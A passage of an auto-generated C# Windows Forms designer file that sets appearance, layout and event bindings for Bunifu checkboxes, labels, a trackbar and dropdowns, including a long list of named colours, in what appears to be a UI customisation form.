        this.EnableFlag.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableFlag.OnCheck.BorderRadius = 6;
        this.EnableFlag.OnCheck.BorderThickness = 2;
        this.EnableFlag.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableFlag.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableFlag.OnCheck.CheckmarkThickness = 2;
        this.EnableFlag.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableFlag.OnDisable.BorderRadius = 6;
        this.EnableFlag.OnDisable.BorderThickness = 2;
        this.EnableFlag.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableFlag.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableFlag.OnDisable.CheckmarkThickness = 2;
        this.EnableFlag.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableFlag.OnHoverChecked.BorderRadius = 6;
        this.EnableFlag.OnHoverChecked.BorderThickness = 2;
        this.EnableFlag.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableFlag.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableFlag.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableFlag.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableFlag.OnHoverUnchecked.BorderRadius = 6;
        this.EnableFlag.OnHoverUnchecked.BorderThickness = 1;
        this.EnableFlag.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableFlag.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableFlag.OnUncheck.BorderRadius = 6;
        this.EnableFlag.OnUncheck.BorderThickness = 1;
        this.EnableFlag.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableFlag.Size = new System.Drawing.Size(21, 21);
        this.EnableFlag.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableFlag.TabIndex = 641;
        this.EnableFlag.ThreeState = false;
        this.EnableFlag.ToolTipText = null;
        this.EnableFlag.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableFlag_CheckedChanged);
        // 
        // TxFlag
        // 
        this.TxFlag.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxFlag.AutoSize = true;
        this.TxFlag.BackColor = System.Drawing.Color.Transparent;
        this.TxFlag.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxFlag.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxFlag.ForeColor = System.Drawing.Color.Black;
        this.TxFlag.Location = new System.Drawing.Point(44, 335);
        this.TxFlag.Name = "TxFlag";
        this.TxFlag.Size = new System.Drawing.Size(67, 15);
        this.TxFlag.TabIndex = 640;
        this.TxFlag.Text = "Enable Flag";
        // 
        // CurvatureFormTrackBar
        // 
        this.CurvatureFormTrackBar.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(193)))), ((int)(((byte)(200)))), ((int)(((byte)(207)))));
        this.CurvatureFormTrackBar.HoverState.Parent = this.CurvatureFormTrackBar;
        this.CurvatureFormTrackBar.Location = new System.Drawing.Point(20, 190);
        this.CurvatureFormTrackBar.Maximum = 60;
        this.CurvatureFormTrackBar.Name = "CurvatureFormTrackBar";
        this.CurvatureFormTrackBar.Size = new System.Drawing.Size(342, 21);
        this.CurvatureFormTrackBar.TabIndex = 638;
        this.CurvatureFormTrackBar.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.CurvatureFormTrackBar.Value = 60;
        this.CurvatureFormTrackBar.ValueChanged += new System.EventHandler(this.CurvatureFormTrackBar_ValueChanged);
        this.CurvatureFormTrackBar.Scroll += new System.Windows.Forms.ScrollEventHandler(this.CurvatureFormTrackBar_Scroll);
        // 
        // EdgecurvatureForm
        // 
        this.EdgecurvatureForm.AllowBindingControlAnimation = true;
        this.EdgecurvatureForm.AllowBindingControlColorChanges = false;
        this.EdgecurvatureForm.AllowBindingControlLocation = true;
        this.EdgecurvatureForm.AllowCheckBoxAnimation = true;
        this.EdgecurvatureForm.AllowCheckmarkAnimation = true;
        this.EdgecurvatureForm.AllowOnHoverStates = true;
        this.EdgecurvatureForm.AutoCheck = true;
        this.EdgecurvatureForm.BackColor = System.Drawing.Color.Transparent;
        this.EdgecurvatureForm.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EdgecurvatureForm.BackgroundImage")));
        this.EdgecurvatureForm.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EdgecurvatureForm.BindingControl = this.label1;
        this.EdgecurvatureForm.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EdgecurvatureForm.BorderRadius = 6;
        this.EdgecurvatureForm.Checked = false;
        this.EdgecurvatureForm.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EdgecurvatureForm.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EdgecurvatureForm.CustomCheckmarkImage = null;
        this.EdgecurvatureForm.Location = new System.Drawing.Point(20, 104);
        this.EdgecurvatureForm.MinimumSize = new System.Drawing.Size(17, 17);
        this.EdgecurvatureForm.Name = "EdgecurvatureForm";
        this.EdgecurvatureForm.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EdgecurvatureForm.OnCheck.BorderRadius = 6;
        this.EdgecurvatureForm.OnCheck.BorderThickness = 2;
        this.EdgecurvatureForm.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EdgecurvatureForm.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EdgecurvatureForm.OnCheck.CheckmarkThickness = 2;
        this.EdgecurvatureForm.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EdgecurvatureForm.OnDisable.BorderRadius = 6;
        this.EdgecurvatureForm.OnDisable.BorderThickness = 2;
        this.EdgecurvatureForm.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EdgecurvatureForm.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EdgecurvatureForm.OnDisable.CheckmarkThickness = 2;
        this.EdgecurvatureForm.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EdgecurvatureForm.OnHoverChecked.BorderRadius = 6;
        this.EdgecurvatureForm.OnHoverChecked.BorderThickness = 2;
        this.EdgecurvatureForm.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EdgecurvatureForm.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EdgecurvatureForm.OnHoverChecked.CheckmarkThickness = 2;
        this.EdgecurvatureForm.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EdgecurvatureForm.OnHoverUnchecked.BorderRadius = 6;
        this.EdgecurvatureForm.OnHoverUnchecked.BorderThickness = 1;
        this.EdgecurvatureForm.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EdgecurvatureForm.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EdgecurvatureForm.OnUncheck.BorderRadius = 6;
        this.EdgecurvatureForm.OnUncheck.BorderThickness = 1;
        this.EdgecurvatureForm.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EdgecurvatureForm.Size = new System.Drawing.Size(21, 21);
        this.EdgecurvatureForm.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EdgecurvatureForm.TabIndex = 637;
        this.EdgecurvatureForm.ThreeState = false;
        this.EdgecurvatureForm.ToolTipText = null;
        this.EdgecurvatureForm.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EdgecurvatureForm_CheckedChanged);
        // 
        // label1
        // 
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label1.ForeColor = System.Drawing.Color.Black;
        this.label1.Location = new System.Drawing.Point(44, 108);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(124, 15);
        this.label1.TabIndex = 636;
        this.label1.Text = "Enable Edge curvature";
        // 
        // EnableIP
        // 
        this.EnableIP.AllowBindingControlAnimation = true;
        this.EnableIP.AllowBindingControlColorChanges = false;
        this.EnableIP.AllowBindingControlLocation = true;
        this.EnableIP.AllowCheckBoxAnimation = true;
        this.EnableIP.AllowCheckmarkAnimation = true;
        this.EnableIP.AllowOnHoverStates = true;
        this.EnableIP.AutoCheck = true;
        this.EnableIP.BackColor = System.Drawing.Color.Transparent;
        this.EnableIP.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableIP.BackgroundImage")));
        this.EnableIP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableIP.BindingControl = this.TxIP;
        this.EnableIP.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableIP.BorderRadius = 6;
        this.EnableIP.Checked = false;
        this.EnableIP.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableIP.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableIP.CustomCheckmarkImage = null;
        this.EnableIP.Location = new System.Drawing.Point(20, 304);
        this.EnableIP.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableIP.Name = "EnableIP";
        this.EnableIP.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableIP.OnCheck.BorderRadius = 6;
        this.EnableIP.OnCheck.BorderThickness = 2;
        this.EnableIP.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableIP.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableIP.OnCheck.CheckmarkThickness = 2;
        this.EnableIP.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableIP.OnDisable.BorderRadius = 6;
        this.EnableIP.OnDisable.BorderThickness = 2;
        this.EnableIP.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableIP.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableIP.OnDisable.CheckmarkThickness = 2;
        this.EnableIP.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableIP.OnHoverChecked.BorderRadius = 6;
        this.EnableIP.OnHoverChecked.BorderThickness = 2;
        this.EnableIP.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableIP.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableIP.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableIP.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableIP.OnHoverUnchecked.BorderRadius = 6;
        this.EnableIP.OnHoverUnchecked.BorderThickness = 1;
        this.EnableIP.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableIP.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableIP.OnUncheck.BorderRadius = 6;
        this.EnableIP.OnUncheck.BorderThickness = 1;
        this.EnableIP.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableIP.Size = new System.Drawing.Size(21, 21);
        this.EnableIP.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableIP.TabIndex = 639;
        this.EnableIP.ThreeState = false;
        this.EnableIP.ToolTipText = null;
        this.EnableIP.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableIP_CheckedChanged);
        // 
        // TxIP
        // 
        this.TxIP.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxIP.AutoSize = true;
        this.TxIP.BackColor = System.Drawing.Color.Transparent;
        this.TxIP.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxIP.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxIP.ForeColor = System.Drawing.Color.Black;
        this.TxIP.Location = new System.Drawing.Point(44, 308);
        this.TxIP.Name = "TxIP";
        this.TxIP.Size = new System.Drawing.Size(55, 15);
        this.TxIP.TabIndex = 638;
        this.TxIP.Text = "Enable IP";
        // 
        // CurvatureProperties
        // 
        this.CurvatureProperties.BackColor = System.Drawing.Color.Transparent;
        this.CurvatureProperties.BackgroundColor = System.Drawing.Color.White;
        this.CurvatureProperties.BorderColor = System.Drawing.Color.Silver;
        this.CurvatureProperties.BorderRadius = 1;
        this.CurvatureProperties.Color = System.Drawing.Color.Silver;
        this.CurvatureProperties.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.CurvatureProperties.DisabledBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.CurvatureProperties.DisabledBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.CurvatureProperties.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.CurvatureProperties.DisabledForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        this.CurvatureProperties.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.CurvatureProperties.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.CurvatureProperties.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.CurvatureProperties.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.CurvatureProperties.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.CurvatureProperties.FillDropDown = true;
        this.CurvatureProperties.FillIndicator = false;
        this.CurvatureProperties.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.CurvatureProperties.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.CurvatureProperties.ForeColor = System.Drawing.Color.Black;
        this.CurvatureProperties.FormattingEnabled = true;
        this.CurvatureProperties.Icon = null;
        this.CurvatureProperties.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.CurvatureProperties.IndicatorColor = System.Drawing.Color.DarkGray;
        this.CurvatureProperties.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.CurvatureProperties.IndicatorThickness = 2;
        this.CurvatureProperties.IsDropdownOpened = false;
        this.CurvatureProperties.ItemBackColor = System.Drawing.Color.White;
        this.CurvatureProperties.ItemBorderColor = System.Drawing.Color.White;
        this.CurvatureProperties.ItemForeColor = System.Drawing.Color.Black;
        this.CurvatureProperties.ItemHeight = 20;
        this.CurvatureProperties.ItemHighLightColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.CurvatureProperties.ItemHighLightForeColor = System.Drawing.Color.White;
        this.CurvatureProperties.Items.AddRange(new object[] {
            "Transparent",
            "Aqua",
            "Black",
            "BlanchedAlmond",
            "Blue",
            "BlueViolet",
            "Brown",
            "BurlyWood",
            "CadetBlue",
            "Chartreuse",
            "Chocolate",
            "Coral",
            "CornflowerBlue",
            "Cornsilk",
            "Crimson",
            "Cyan",
            "DarkBlue",
            "DarkCyan",
            "DarkGoldenrod",
            "DarkGray",
            "DarkGreen",
            "DarkKhaki",
            "DarkMagenta",
            "DarkOliveGreen",
            "DarkOrange",
            "DarkOrchid",
            "DarkRed",
            "DarkSalmon",
            "DarkSeaGreen",
            "DarkSlateBlue",
            "DarkSlateGray",
            "DarkTurquoise",
            "DarkViolet",
            "DeepPink",
            "DeepSkyBlue",
            "DimGray",
            "DodgerBlue",
            "Firebrick",
            "FloralWhite",
            "ForestGreen",
            "Fuchsia",
            "Gainsboro",
            "GhostWhite",
            "Gold",
            "Goldenrod",
            "Gray",
            "Green",
            "GreenYellow",
            "Honeydew",
            "HotPink",
            "IndianRed",
            "Indigo",
            "Ivory",
            "Khaki",
            "Lavender",
            "LavenderBlush",
            "LawnGreen",
            "LightBlue",
            "LightCoral",
            "LightCyan",
            "LightGoldenrodYellow",
            "LightGreen",
            "LightGray",
            "LightPink",
            "LightSeaGreen",
            "LightSkyBlue",
            "LightSteelBlue",
            "LightYellow",
            "Lime",
            "LimeGreen",
            "Linen",
            "Magenta",
            "Maroon",
            "MediumAquamarine",
            "MediumBlue",
            "MediumOrchid",
            "MediumPurple",
            "MediumSeaGreen",
            "MediumSlateBlue",
            "MediumSpringGreen",
            "MediumTurquoise",
            "MediumVioletRed",
            "MidnightBlue",
            "MintCream",
            "MistyRose",
            "Moccasin",
            "NavajoWhite",
            "Navy",
            "OldLace",
            "Olive",
            "OliveDrab",
            "Orange",
            "OrangeRed",
            "Orchid",
            "PaleGoldenrod",
            "PaleGreen",
            "PaleTurquoise",
            "PaleVioletRed",
            "PapayaWhip",
            "PeachPuff",
            "Peru",
            "Pink",
            "Plum",
            "PowderBlue",
            "Purple",
            "Red",
            "RosyBrown",
            "RoyalBlue",
            "SaddleBrown",
            "Salmon",
            "SandyBrown",
            "SeaGreen",
            "SeaShell",
            "Sienna",
            "Silver",
            "SkyBlue",
            "SlateBlue",
            "SlateGray",
            "SpringGreen",
            "SteelBlue",
            "Tan",
            "Teal",
            "Thistle",
            "Tomato",
            "Turquoise",
            "Violet",
            "YellowGreen"});
        this.CurvatureProperties.ItemTopMargin = 3;
        this.CurvatureProperties.Location = new System.Drawing.Point(20, 133);
        this.CurvatureProperties.Name = "CurvatureProperties";
        this.CurvatureProperties.Size = new System.Drawing.Size(120, 26);
        this.CurvatureProperties.TabIndex = 621;
        this.CurvatureProperties.Text = null;
        this.CurvatureProperties.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.CurvatureProperties.TextLeftMargin = 5;
        this.CurvatureProperties.Visible = false;
        this.CurvatureProperties.SelectedIndexChanged += new System.EventHandler(this.CurvatureProperties_SelectedIndexChanged);
        // 
        // EnableID
        // 
        this.EnableID.AllowBindingControlAnimation = true;
        this.EnableID.AllowBindingControlColorChanges = false;
        this.EnableID.AllowBindingControlLocation = true;
        this.EnableID.AllowCheckBoxAnimation = true;
        this.EnableID.AllowCheckmarkAnimation = true;
        this.EnableID.AllowOnHoverStates = true;
        this.EnableID.AutoCheck = true;
        this.EnableID.BackColor = System.Drawing.Color.Transparent;
        this.EnableID.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableID.BackgroundImage")));
        this.EnableID.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableID.BindingControl = this.TxID;
        this.EnableID.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableID.BorderRadius = 6;
        this.EnableID.Checked = false;
        this.EnableID.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableID.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableID.CustomCheckmarkImage = null;
        this.EnableID.Location = new System.Drawing.Point(20, 277);
        this.EnableID.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableID.Name = "EnableID";
        this.EnableID.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableID.OnCheck.BorderRadius = 6;
        this.EnableID.OnCheck.BorderThickness = 2;
        this.EnableID.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableID.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableID.OnCheck.CheckmarkThickness = 2;
        this.EnableID.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableID.OnDisable.BorderRadius = 6;
        this.EnableID.OnDisable.BorderThickness = 2;
        this.EnableID.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableID.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableID.OnDisable.CheckmarkThickness = 2;
        this.EnableID.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableID.OnHoverChecked.BorderRadius = 6;
        this.EnableID.OnHoverChecked.BorderThickness = 2;
        this.EnableID.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableID.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableID.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableID.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableID.OnHoverUnchecked.BorderRadius = 6;
        this.EnableID.OnHoverUnchecked.BorderThickness = 1;
        this.EnableID.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableID.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableID.OnUncheck.BorderRadius = 6;
        this.EnableID.OnUncheck.BorderThickness = 1;
        this.EnableID.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableID.Size = new System.Drawing.Size(21, 21);
        this.EnableID.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableID.TabIndex = 637;
        this.EnableID.ThreeState = false;
        this.EnableID.ToolTipText = null;
        this.EnableID.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableID_CheckedChanged);
        // 
        // TxID
        // 
        this.TxID.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxID.AutoSize = true;
        this.TxID.BackColor = System.Drawing.Color.Transparent;
        this.TxID.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxID.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxID.ForeColor = System.Drawing.Color.Black;
        this.TxID.Location = new System.Drawing.Point(44, 281);
        this.TxID.Name = "TxID";
        this.TxID.Size = new System.Drawing.Size(56, 15);
        this.TxID.TabIndex = 636;
        this.TxID.Text = "Enable ID";
        // 
        // TransitionSpeed
        // 
        this.TransitionSpeed.BackColor = System.Drawing.Color.Transparent;
        this.TransitionSpeed.BackgroundColor = System.Drawing.Color.White;
        this.TransitionSpeed.BorderColor = System.Drawing.Color.Silver;
        this.TransitionSpeed.BorderRadius = 1;
        this.TransitionSpeed.Color = System.Drawing.Color.Silver;
        this.TransitionSpeed.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.TransitionSpeed.DisabledBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionSpeed.DisabledBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TransitionSpeed.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionSpeed.DisabledForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        this.TransitionSpeed.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionSpeed.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.TransitionSpeed.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.TransitionSpeed.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.TransitionSpeed.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionSpeed.FillDropDown = true;
        this.TransitionSpeed.FillIndicator = false;
        this.TransitionSpeed.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.TransitionSpeed.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TransitionSpeed.ForeColor = System.Drawing.Color.Black;
        this.TransitionSpeed.FormattingEnabled = true;
        this.TransitionSpeed.Icon = null;
        this.TransitionSpeed.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionSpeed.IndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionSpeed.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionSpeed.IndicatorThickness = 2;
        this.TransitionSpeed.IsDropdownOpened = false;
        this.TransitionSpeed.ItemBackColor = System.Drawing.Color.White;
        this.TransitionSpeed.ItemBorderColor = System.Drawing.Color.White;
        this.TransitionSpeed.ItemForeColor = System.Drawing.Color.Black;
        this.TransitionSpeed.ItemHeight = 20;
        this.TransitionSpeed.ItemHighLightColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TransitionSpeed.ItemHighLightForeColor = System.Drawing.Color.White;
        this.TransitionSpeed.Items.AddRange(new object[] {
            "1",
            "2",
            "3",
            "4",
            "5",
            "6"});
        this.TransitionSpeed.ItemTopMargin = 3;
        this.TransitionSpeed.Location = new System.Drawing.Point(292, 65);
        this.TransitionSpeed.Name = "TransitionSpeed";
        this.TransitionSpeed.Size = new System.Drawing.Size(70, 26);
        this.TransitionSpeed.TabIndex = 620;
        this.TransitionSpeed.Text = null;
        this.TransitionSpeed.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionSpeed.TextLeftMargin = 5;
        this.TransitionSpeed.SelectedIndexChanged += new System.EventHandler(this.TransitionSpeed_SelectedIndexChanged);
        // 
        // TransitionOut
        // 
        this.TransitionOut.BackColor = System.Drawing.Color.Transparent;
        this.TransitionOut.BackgroundColor = System.Drawing.Color.White;
        this.TransitionOut.BorderColor = System.Drawing.Color.Silver;
        this.TransitionOut.BorderRadius = 1;
        this.TransitionOut.Color = System.Drawing.Color.Silver;
        this.TransitionOut.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.TransitionOut.DisabledBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionOut.DisabledBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TransitionOut.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        this.TransitionOut.DisabledForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        this.TransitionOut.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionOut.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.TransitionOut.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.TransitionOut.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.TransitionOut.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.TransitionOut.FillDropDown = true;
        this.TransitionOut.FillIndicator = false;
        this.TransitionOut.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.TransitionOut.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TransitionOut.ForeColor = System.Drawing.Color.Black;
        this.TransitionOut.FormattingEnabled = true;
        this.TransitionOut.Icon = null;
        this.TransitionOut.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionOut.IndicatorColor = System.Drawing.Color.DarkGray;
        this.TransitionOut.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.TransitionOut.IndicatorThickness = 2;
        this.TransitionOut.IsDropdownOpened = false;
        this.TransitionOut.ItemBackColor = System.Drawing.Color.White;
        this.TransitionOut.ItemBorderColor = System.Drawing.Color.White;
